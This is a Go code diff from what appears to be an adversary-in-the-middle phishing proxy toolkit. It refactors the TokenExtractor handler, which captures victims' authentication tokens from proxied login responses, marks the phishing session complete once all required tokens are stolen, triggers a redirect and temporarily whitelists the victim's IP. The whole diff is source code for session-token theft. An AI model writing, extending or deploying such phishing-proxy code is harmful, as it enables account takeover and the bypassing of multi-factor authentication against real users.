@@ -10,19 +10,13 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 )
 
-type sessionUpdater interface {
-	UpdateSession(session *aitm.Session) error
-}
-
-type eventPublisher interface {
-	Publish(event aitm.Event)
-}
-
-type SessionCompleter interface {
+type sessionCompleter interface {
+	Update(session *aitm.Session) error
+	Complete(session *aitm.Session) error
 	IsComplete(sess *aitm.Session, def *aitm.Phishlet) bool
 }
 
-type TemporaryWhitelister interface {
+type temporaryWhitelister interface {
 	WhitelistTemporary(ip string, dur time.Duration)
 }
 
@@ -35,10 +29,8 @@ const temporaryWhitelistDuration = 10 * time.Minute
 // When all required tokens are captured it marks the session complete and
 // publishes EventSessionCompleted so the WebSocket redirect fires.
 type TokenExtractor struct {
-	Store     sessionUpdater
-	Bus       eventPublisher
-	Completer SessionCompleter
-	Whitelist TemporaryWhitelister // may be nil
+	Sessions  sessionCompleter
+	Whitelist temporaryWhitelister // may be nil
 	Logger    *slog.Logger
 }
 
@@ -57,18 +49,15 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 			updated = h.extractHeaderToken(ctx, resp, rule) || updated
 		}
 	}
-	if !ctx.Session.IsDone() && h.Completer.IsComplete(ctx.Session, ctx.Phishlet) {
-		completedAt := time.Now()
-		ctx.Session.CompletedAt = &completedAt
-		if err := h.Store.UpdateSession(ctx.Session); err != nil {
-			h.Logger.Warn("failed to persist session completion", "session_id", ctx.Session.ID, "error", err)
+	if !ctx.Session.IsDone() && h.Sessions.IsComplete(ctx.Session, ctx.Phishlet) {
+		if err := h.Sessions.Complete(ctx.Session); err != nil {
+			h.Logger.Warn("failed to complete session", "session_id", ctx.Session.ID, "error", err)
 		}
-		h.Bus.Publish(aitm.Event{Type: aitm.EventSessionCompleted, Payload: ctx.Session})
 		if h.Whitelist != nil {
 			h.Whitelist.WhitelistTemporary(ctx.ClientIP, temporaryWhitelistDuration)
 		}
 	} else if updated {
-		if err := h.Store.UpdateSession(ctx.Session); err != nil {
+		if err := h.Sessions.Update(ctx.Session); err != nil {
 			h.Logger.Warn("failed to persist captured tokens", "session_id", ctx.Session.ID, "error", err)
 		}
 	}
